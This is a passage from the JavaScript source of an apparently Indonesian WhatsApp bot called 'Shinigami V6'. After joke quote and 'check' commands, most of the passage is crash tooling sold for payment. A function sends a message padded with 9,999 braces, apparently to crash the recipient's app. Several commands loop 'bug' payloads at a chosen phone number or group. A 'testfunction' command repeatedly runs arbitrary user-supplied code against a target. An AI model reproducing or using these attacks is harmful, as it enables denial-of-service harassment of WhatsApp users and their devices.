    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Hazazeltruth = bucin[Math.floor(Math.random() * bucin.length)]
	payreply(`${Hazazeltruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  payreply(bacotan)
}
break
                
case "cekganteng": {
if (!args[0]) return payreply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break

case "cekcantik": {
if (!args[0]) return payreply('NAMA LU MANA??')
const cantik = [
"cuman 10% doang", 
"20% kurang cantik soal nya", 
"0% karna nggak cantik", 
"30% mayan cantikk", 
"40% cantik", 
"50% otw bikin cowo salting 😎", 
"60% orang cantik", 
"70% cantik bet", 
"80% cantikk parah", 
"90% cantik idaman cowo", 
"100% cantik bgt bjirr"
]
const hasil = cantik[Math.floor(Math.random() * cantik.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return payreply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Kulkas 2 pintu",
"Kumis lele",
"Kumis Lele",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  payreply(kodamn)
}
break

case "cekkontol": case "kontol": {
if (!q) return payreply(`Ketik Nama Yang Mau Di Cek.
Example : 
${prefix+command} depay`)

	const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
    `punya si ${q} ada sih tapi mode hemat energi 🗿`,
    `scan selesai... punya ${q} terdeteksi tapi ukuran nano`,
    `punya ${q} ada tapi lagi sembunyi jir 😹`,
    `punya ${q} offline dulu katanya malu`,
    `punya ${q} ketemu... tapi kecil bet anjir`,
    `punya ${q} hilang di semak semak`,
    `punya ${q} ada tapi lagi update sistem`,
    `punya ${q} lagi loading sabar bang`,
    `punya ${q} ketahuan tapi mini size 😭`,
    `punya ${q} ada tapi takut keluar`,
    `punya ${q} scan gagal... terlalu kecil buat dideteksi`,
    `punya ${q} ada tapi lagi AFK`,
    `punya ${q} ketemu tapi cuma trial version`,
]
const kodam = khodam[Math.floor(Math.random() * khodam.length)]

	const respons = `
 °「 *CEK KONTOL* 」°

 • *Nama :* ${q}
 • *Kontol :* ${kodam}
	  `
  
	payreply(respons)
  }
break
            case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await Asepp.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await Asepp.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break

case 'ping': {
  const os = require('os')
  const { performance } = require('perf_hooks')

  // Hitung Speed Bot
  const start = performance.now()
  const end = performance.now()
  const latensi = (end - start).toFixed(4)

  // Ambil Data VPS
  const usedRAM = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)
  const totalRAM = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2)
  const freeRAM = (os.freemem() / 1024 / 1024 / 1024).toFixed(2)
  const cpuModel = os.cpus()[0].model
  const cpuSpeed = os.cpus()[0].speed
  const cpuCore = os.cpus().length
  const platform = os.platform()
  const uptime = process.uptime()

  // Format Waktu Uptime
  const formatUptime = (seconds) => {
    const d = Math.floor(seconds / (3600 * 24))
    const h = Math.floor((seconds % (3600 * 24)) / 3600)
    const m = Math.floor((seconds % 3600) / 60)
    const s = Math.floor(seconds % 60)
    return `${d}d ${h}h ${m}m ${s}s`
  }

  const teks = 
`⌲ \`[ 𝚂𝚈𝚂𝚃𝙴𝙼 𝚂𝚃𝙰𝚃𝚄𝚂 ]\`

◦ *Speed:* ${latensi} ms
◦ *Uptime:* ${formatUptime(uptime)}
◦ *Platform:* ${platform}

┌───[ 𝚅𝙿𝚂 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ]
│ ◦ *CPU:* ${cpuModel}
│ ◦ *Cores:* ${cpuCore} Core (${cpuSpeed} MHz)
│ ◦ *RAM Used:* ${usedRAM} MB
│ ◦ *Total RAM:* ${totalRAM} GB
│ ◦ *Free RAM:* ${freeRAM} GB
└───[ 𝚂𝙷𝙸𝙽𝙸𝙶𝙰𝙼𝙸 𝙴𝙽𝙶𝙸𝙽𝙴 ]`

  await Asepp.sendMessage(m.chat, { 
    text: teks,
    contextInfo: {
      externalAdReply: {
        title: "SYSTEM PERFORMANCE",
        body: "Checking VPS Resources...",
        thumbnailUrl: "https://img2.pixhost.to/images/7306/716638001_asepp.jpg",
        sourceUrl: "https://wa.me/62881036109288",
        mediaType: 1,
        renderLargerThumbnail: false
      }
    }
  }, { quoted: m })
}
break
case "info": {
  const media = await prepareWAMessageMedia({ image: { url: "https://img2.pixhost.to/images/7306/716637890_asepp.jpg" } }, { upload: Asepp.waUploadToServer })
  return await Asepp.relayMessage(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "⏤ *[ INFORMATION SYSTEM ]* ⏤" },
          footer: { text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐓𝐎 𝐁𝐑𝐈𝐆𝐇𝐓✨" },
          carouselMessage: {
            cards: [
              {
                header: { title: "PAYMENT METHOD", hasMediaAttachment: true, ...media },
                body: { text: "◦ *Provider:* DANA ONLY\n◦ *Nomor:* 62882009545852\n\n_Transfer sesuai harga, lalu kirim bukti ke admin._" },
                nativeFlowMessage: { buttons: [
                  { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "Salin Nomor Dana", copy_code: "082190914782" }) },
                  { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "Kirim Bukti", url: "https://wa.me/62881036109288" }) }
                ]}
              },
              {
                header: { title: "VIP TERMS", hasMediaAttachment: true, ...media },
                body: { text: "1. Script Encrypted Version.\n2. No Resell tanpa izin.\n3. Support VPS/RDP Ready.\n4. No Refund jika script sudah dikirim." },
                nativeFlowMessage: { buttons: [
                  { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "Back To Menu", id: ".menu" }) }
                ]}
              }
            ]
          }
        }
      }
    }
  }, { quoted: m })
}
break
                
case "hidetag":
case "ht":

case "tagall": {
  if (!isGroup) return payreply(mess.group)
  if (!text) return payreply("pesannya")

  let teks = text + "\n\n"

  let groupMetadata
  try {
    groupMetadata = await Asepp.groupMetadata(m.chat)
  } catch {
    return
  }

  let member = groupMetadata.participants
    .map(v => v.id)
    .filter(e => e !== botNumber && e !== m.sender)

  for (let e of member) {
    teks += `@${e.split("@")[0]}\n`
  }

  await Asepp.sendMessage(
    m.chat,
    { text: teks, mentions: member },
    { quoted: m }
  )
}
break

case 'open':
case 'buka': {
    if (!m.isGroup) return payreply(mess.group)
    Asepp.groupSettingUpdate(m.chat, 'not_announcement')
    payreply('✅ Grup berhasil dibuka')
}
break

case 'close':
case 'tutup': {
    if (!m.isGroup) return payreply(mess.group)
    Asepp.groupSettingUpdate(m.chat, 'announcement')
    payreply('✅ Grup berhasil ditutup')
}
break

case 'qc': {
  if (!q) return payreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await Asepp.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Asepp.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
        
 async function fclohrek2(target) {
    await Asepp.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "𝐅𝐜 𝐉𝐢𝐫" },
                    footer: { text: "👑" },
                    contextInfo: {},
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({
                                    booking_id: "𝐁𝐨𝐤𝐞𝐩𝐂𝐡𝐚𝐧𝐞𝐥",
                                    status: "confirmed",
                                    business_name: "𝐓𝐎𝐊𝐎 𝐁𝐎𝐊𝐄𝐏 𝐖𝐎𝐈𝐈",
                                    service_name: "AsepXxnx",
                                    appointment_time: "2026-04-28T10:00:00Z",
                                    customer: {
                                        name: "AsepXyz",
                                        phone: "62881036109288"
                                    }
                                })
                            }
                        ],
                        messageParamsJson: "{".repeat(9999)
                    }
                }
            }
        }
    }, {})
}
        
case "testfunction": {
    if (!isCreator) return payreply(mess.owner);
    if (!text.includes("|"))
        return payreply(
`Gunakan format yang benar contoh:
.testfunction Nomor|Loop|async function maklu(target)\nawait maklu(target)
`
        );

    const [nomorRaw, loopRaw, funcFull] = text.split("|");  
    const nomor = nomorRaw.replace(/[^0-9]/g, "");  
    const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 1000));  

    if (!nomor) return payreply("❌ Nomor tidak valid!");  
    if (!funcFull) return payreply("❌ Masukkan function async yang benar!");  

    const target = nomor + "@s.whatsapp.net";  
    const sandbox = {  
        Asepp,  
        target,  
        console,  
        Buffer,  
        sleep: (ms) => new Promise(r => setTimeout(r, ms)),  
        generateWAMessageFromContent,  
        proto  
    };  

    const context = vm.createContext(sandbox);
    const funcNameMatch = funcFull.match(/async function (\w+)/);
    const funcName = funcNameMatch ? funcNameMatch[1] : "UnknownFunction";
    let adaError = false;

    for (let i = 0; i < jumlah; i++) {
    try {
        await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
    } catch (err) {
        adaError = true;
        await payreply(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
        console.log("Error exec:", err);
        break;
    }

    await sandbox.sleep(300); //delay mamaklu
}

if (!adaError) {
    replybug2(
`⏤ *[ 𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 ]* ⏤
ᯓ Function : ${funcName}
ᯓ Target : ${nomor}
ᯓ Loop : ${jumlah}
ᯓ Status : Success ✅
`
    );
}

break;
}

// Case Bak Grup
case 'shinigami-killgroup':
case 'shinigami-blankgroup': {
    if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
    
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/);
    if (!match) return payreply(`*Format Salah!*\nContoh: ${command} https://chat.whatsapp.com/xxxxxx`);

    let linkCode = match[1];

    try {
        let GroupJid = await Asepp.groupAcceptInvite(linkCode);

        replybug2(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Processing ⏳
> Please wait`);

        await sleep(3000);

        for (let r = 0; r < 1; r++) {
            await fclohrek(GroupJid);
            await fclohrek(GroupJid);
            await sleep(5000);
        }
        
        replybug2(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽\`
ᯓ GroupJid : ${GroupJid}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`);

    } catch (err) {
        console.error("ERROR:", err);
        return payreply(`Gagal mengeksekusi!\n\n*Detail:* ${err}`);
    }
}
break;

// Case Bak //case delay bebas spam
case 'vcxl': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 3; i++) {
await kacunk(Asepp, target)
await kacunk(Asepp, target)
await Colmek(Asepp, target)
await Colmek(Asepp, target)
}
}
break

case 'shinigami-fc':
case 'fc-invis':
case 'forclose-shinigami': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
const mention = [target]
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await Fcinpis(Asepp, target, true)
await Fcinpis(Asepp, target, true)
}
}
break

case 'shinigami-bullldozerv2':
case 'shinigami-attack':
case 'shinigami-bulldozer': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 100; i++) {
await X7Bulldozer(Asepp, target)
await X7Bulldozer(Asepp, target)
await YouAreTheReason(Asepp, target)
await YouAreTheReason(Asepp, target)
}
}
break

case 'delay-god':
case 'delay-shinigami':
case 'delay-hard':
case 'delay-maker': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 50; i++) {
await dingleyhard(Asepp, target, ptcp = true)
await dingleyhard(Asepp, target, ptcp = true)
}
}
break

case 'blank-one':
case 'blank-phone':
case 'blank-shinigami': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`, target)
for (let i = 0; i < 25; i++) {
await xxx(Asepp,target)
await xxx(Asepp,target)
}
}
break
case 'ios-attack':
case 'shinigami-ios': {
if (!isCreator && !isPremium && !isUnli) return payreply(mess.owner);
if (!q) return payreply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await replybug(`\`𝗦𝗵𝗶𝗻𝗶𝗴𝗮𝗺𝗶 𝗔𝘁𝘁𝗮𝗰𝗸 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽\`
ᯓ Target : ${target}
ᯓ Type Bug : ${command}
ᯓ Status : Success Attack ✅
> Please wait 5–10 minutes to prevent your WhatsApp from being banned.`)
for (let i = 0; i < 50; i++) {
await shinigamiCrashios(Asepp, target)
await shinigamiCrashios(Asepp, target)
}
}




case 'payment': case 'pay': case 'donasi': {
await Asepp.sendMessage(m.chat, { react: { text: "💸", key: m.key } })

let nomorDana = "0882009545852"
let namaDana = "ASEP"
let qrisUrl = "https://litter.catbox.moe/0qdy1e.jpeg"
let ownerWa = "62881036109288"

let teks = `*⌜ 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐆𝐀𝐓𝐄𝐖𝐀𝐘 ⌟*\n`
teks += `*╭━━━━━━━━⭓*\n`
teks += `*│* 𝗦𝗛𝗜𝗡𝗜𝗚𝗔𝗠𝗜 𝗩𝟲 𝗦𝗬𝗦𝗧𝗘𝗠\n`
teks += `*╰━━━━━━━━━━━━━━━━⭓*\n\n`
teks += `Halo @${m.sender.split('@')[0]} 👋\n`
teks += `_Terimakasih telah order di Shinigami V6_\n\n`
teks += `*┌─⭓『 DANA E-WALLET 』*\n`
teks += `*│* 📱 Nomor : *${nomorDana}*\n`
teks += `*│* 👤 A/N : *${namaDana}*\n`
teks += `*│* 💬 Note : Wajib sertakan bukti TF\n`
teks += `*└────────────⭓*\n\n`
teks += `*┌─⭓『 QRIS ALL PAYMENT 』*\n`
teks += `*│* 📷 Scan QR Code di atas\n`
teks += `*│* 💳 Support All Bank & E-Wallet\n`
teks += `*│* ⚡ Auto proses 1-5 menit\n`
teks += `*└────────────⭓*\n\n`
teks += `*S T E P B A Y A R :*\n`
teks += `> 1. Transfer sesuai nominal\n`
teks += `> 2. Screenshot bukti transfer\n`
teks += `> 3. Klik "Konfirmasi Owner" di bawah\n`
teks += `> 4. Kirim bukti + tunggu diproses`

const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: `© Asepp Official | Online 24 Jam | Fast Response`
}),
header: proto.Message.InteractiveMessage.Header.create({
hasMediaAttachment: true,
imageMessage: (
await prepareWAMessageMedia(
{ image: { url: qrisUrl } },
{ upload: Asepp.waUploadToServer }
)
).imageMessage
}),
contextInfo: {
mentionedJid: [m.sender, ownerWa + '@s.whatsapp.net'],
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: '𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔 𝐏𝐀𝐘𝐌𝐄𝐍𝐓',
body: `DANA: ${nomorDana} | Klik untuk info lengkap`,
thumbnailUrl: qrisUrl,
sourceUrl: `https://wa.me/${ownerWa}`,
mediaType: 1,
renderLargerThumbnail: true
}
},
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "📋 Salin Nomor DANA",
copy_code: nomorDana
})
},
{
name: "cta_url", 
buttonParamsJson: JSON.stringify({
display_text: "⬇️ Download QRIS HD",
url: qrisUrl
})
},
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "📞 Konfirmasi Owner",
url: `https://wa.me/${ownerWa}?text=*KONFIRMASI%20PEMBAYARAN*%0A%0AHalo%20bang,%20aku%20udah%20TF%20nih%0A%0A*Detail:*%0A➥ Dari: @${m.sender.split('@')[0]}%0A➥ Tujuan: DANA%20${nomorDana}%0A%0AMohon%20dicek%20ya%20🩸`
})
}
]
})
})
}
}
}, { quoted: m })

await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break




case 'listshinigami': {
 const { prepareWAMessageMedia, generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys")

 await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } })

 // --- KONFIGURASI ---
 const qrisUrl = "https://litter.catbox.moe/0qdy1e.jpeg"
 const nomorDana = "0882009545852"
 const namaDana = "ASEP"
 const ownerWa = "62881036109288"
 const linkGrub = "https://chat.whatsapp.com/HluaT9Xo8x4E1BvZk9cXny"

 const mediaCard = await prepareWAMessageMedia(
 { image: { url: qrisUrl } },
 { upload: Asepp.waUploadToServer }
 )

 // --- TOMBOL ORDER ---
 const orderBtn = (title) => [
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "💬 Order " + title,
 url: `https://wa.me/${ownerWa}?text=${encodeURIComponent(`*ORDER SHINIGAMI*\n\nHalo bang, mau order:\n➥ Title: ${title}\n➥ Dari: @${m.sender.split('@')[0]}\n\nMohon info payment🩸`)}`,
 merchant_url: "https://google.com"
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "👥 Join Grup",
 url: linkGrub,
 merchant_url: "https://google.com"
 })
 }
 ]

 // --- TOMBOL PAYMENT ---
 const payBtn = [
 {
 name: "cta_copy",
 buttonParamsJson: JSON.stringify({
 display_text: "📋 Salin DANA",
 copy_code: nomorDana
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "⬇️ Download QRIS",
 url: qrisUrl,
 merchant_url: "https://google.com"
 })
 },
 {
 name: "cta_url",
 buttonParamsJson: JSON.stringify({
 display_text: "✅ Konfirmasi Bayar",
